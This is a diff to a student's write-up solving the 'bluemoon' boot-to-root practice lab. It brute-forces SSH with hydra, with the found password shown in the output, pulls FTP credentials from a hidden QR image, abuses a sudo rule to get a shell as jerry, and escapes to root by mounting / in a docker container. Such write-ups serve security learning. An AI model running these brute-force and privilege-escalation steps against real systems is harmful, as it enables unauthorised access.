@@ -137,8 +137,8 @@ Using the example from Mastering Metasploit to describe Cyber Kill Chain phases 
     sudo msfdb init
     sudo msfconsole
     workspace -a h2-c
-    nmap 172.28.128.0/24
-    nmap -sV 172.28.128.8
+    db_nmap 172.28.128.0/24
+    db_nmap -sV 172.28.128.8
     setg RHOSTS 172.28.128.8
     ```
 
@@ -159,10 +159,92 @@ Using the example from Mastering Metasploit to describe Cyber Kill Chain phases 
 - I decided to try and brute force the ssh login with hydra
 
     ```
-    hydra -l users.txt -P passwords.txt ssh://172.28.128.8
+    hydra -l users.txt -P passwords.txt -t 4 ssh://172.28.128.8
     ```
 
-- I didn't get further than this, but I will continue and update my progress
+- I didn't get further than this, so I had to search the internet for help
+- I found a [blog post](http://vxer.cn/?id=66) and the help of the article I found file hidden_text with a link to an image
+- When you decrypt the png image to text, you get username and password to ftp. I used [zxing.org](https://zxing.org/w/decode.jspx), which results in to
+
+    ```
+    #!/bin/bash
+
+    HOST=ip
+    USER=userftp
+    PASSWORD=ftpp@ssword
+
+    ftp -inv $HOST user $USER $PASSWORD
+    bye
+    EOF
+    ```
+
+- When you login to ftp you find a information.txt and p_list.txt files from ftp. Basically it's telling you to bruteforce the ssh login (so I wasn't too far off) with username robin and a password list
+
+    ```
+    hydra -l robin -P p_lists.txt -t 4 ssh://172.28.128.8
+    ```
+
+- I found a valid password for robin
+
+    ```
+    [DATA] max 4 tasks per 1 server, overall 4 tasks, 32 login tries (l:1/p:32), ~8 tries per task
+    [DATA] attacking ssh://172.28.128.8:22/
+    [22][ssh] host: 172.28.128.8   login: robin   password: k4rv3ndh4nh4ck3r
+    1 of 1 target successfully completed, 1 valid password found
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-13 05:43:04
+    ```
+
+- I logged in and tried sudo
+
+    ```
+    sudo -l
+    ```
+
+- I tells me to run script as jerry
+
+    ```
+    Matching Defaults entries for robin on bluemoon:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+    User robin may run the following commands on bluemoon:
+    (jerry) NOPASSWD: /home/robin/project/feedback.sh
+    ```
+
+- I run the script as jerry
+
+    ```
+    sudo -u jerry /home/robin/project/feedback.sh
+    ```
+
+- I type bash in the feedback field giving me access to console as jerry
+
+  ```
+  whoami
+  jerry
+  ```
+
+- I didn't know what to do now, but the article helped me further
+- as Jerry had docker privileges, we could run alpine container in interactive shell and mount / to /mnt, giving access to root
+
+    ```
+    docker run -it --rm -v /:/mnt alpine
+    
+    whoami
+    root
+
+    ls /mnt/root
+    root.txt
+
+    cat root.txt
+
+    ==> Congratulations <==
+
+    You Reached Root...!
+
+    Root-Flag
+    ```
+
+- This was fun exercise and I definitely learned something new!
 
 ---
 
